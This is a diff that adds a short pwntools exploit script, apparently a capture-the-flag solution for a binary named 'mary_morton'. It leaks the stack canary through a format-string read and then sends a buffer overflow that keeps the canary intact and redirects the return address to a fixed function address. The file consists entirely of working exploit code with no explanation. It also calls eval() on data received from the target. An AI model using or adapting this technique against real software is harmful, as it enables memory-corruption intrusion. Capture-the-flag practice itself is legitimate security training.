@@ -1,0 +1,22 @@
+from pwn import *
+
+Debug=1
+#00000000004008B8
+#00000000004008DA
+#19
+#8F3D4029622FAC00
+if Debug:
+    io=process('./mary_morton')
+else:
+    pass
+
+def main():
+    io.recv()
+    io.sendline('2')
+    io.sendline('%23$p')
+    canary=eval(io.recvuntil('00'))
+    io.recv()
+    io.sendline('1')
+    io.sendline((0x00007FFF4C54E618-0x00007FFF4C54E590)*'a'+p64(canary)+p64(0)+p64(0x00000000004008DA))
+    io.interactive()
+main()
